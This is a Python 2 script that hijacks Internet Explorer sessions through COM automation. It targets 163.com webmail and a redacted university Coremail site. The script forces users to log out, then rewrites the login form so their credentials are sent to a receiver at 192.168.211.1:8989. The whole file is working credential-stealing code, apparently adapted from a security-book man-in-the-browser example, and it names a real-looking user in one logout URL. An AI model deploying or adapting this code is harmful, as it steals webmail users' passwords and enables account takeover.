import win32com.client
import urlparse
import urllib
import time


def wait_for_browser(browser):
    # wait for the browser to finish loading a page
    while browser.ReadyState != 4:
        time.sleep(0.1)
    return

def mail163_logout(windows):
    windows.Document.getElementById("_mail_component_130_130").click()

    return

def mail_aaaa_logout(windows):
    tag_a = windows.Document.getElementsByTagName("a")
    for i in tag_a:
        if i.getAttribute("data-trigger") == "logout":
            print "[*] Find logout label."
            break

    logout = i
    logout.click()
    wait_for_browser(windows)
    print "[*] Logout successed."
    return


data_reveiver = "http://192.168.211.1:8989/"

target_sites = {}

target_sites["mail.163.com"] = {
    # "logout_url": "https://mail.163.com/logout.htm?showAd=1",
    "logout_url": "https://mail.163.com/logout.htm?showAd=1#163|XuRuiyang|1554814617888|true",
    "logout_form": None,
    "login_form_index": 0,
    "login_url": "https://mail.163.com/",
    "owned": False,
    "logout_func":"mail163_logout"
}

target_sites["mail.****.edu.cn"] = {
    "logout_url": None,
    "logout_form": None,
    "login_form_index": 0,
    "login_url": "https://mail.****.edu.cn/coremail/",
    "owned": False,
    "logout_func":"mail_****_logout"
}

# clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
# windows = win32com.client.Dispatch(clsid)
shell = win32com.client.Dispatch("Shell.Application")

while True:
    for windows in shell.Windows():
        if windows.Name == "Windows Internet Explorer":
            url = urlparse.urlparse(windows.LocationURL)
            if url.hostname in target_sites:
                if target_sites[url.hostname]["owned"]:
                    continue

                # if there is a URL, we can just redirect
                if target_sites[url.hostname]["logout_url"]:

                    windows.Navigate(target_sites[url.hostname]["logout_url"])
                    wait_for_browser(windows)

                elif target_sites[url.hostname]["logout_form"]:
                    # retrieve all elements in the document
                    full_doc = windows.Document.all
                    # iterate, looking for the logout form
                    for i in full_doc:
                        try:
                            # find the logout form and submit it
                            if i.id == target_sites[url.hostname]["logout_form"]:
                                i.submit()
                                wait_for_browser()

                        except:
                            pass

                else:
                    eval(target_sites[url.hostname]["logout_func"])(windows)

                # now we modify the login form
                try:
                    login_index = target_sites[url.hostname]["login_form_index"]

                    login_page = urllib.quote(windows.LocationURL)

                    windows.Navigate(target_sites[url.hostname]["login_url"])
                    wait_for_browser(windows)

                    windows.Document.forms[login_index].action = "%s%s"%(data_reveiver, login_page)

                    target_sites[url.hostname]["owned"] = True

                except Exception, e:
                    print e.message
                    pass

    time.sleep(5)
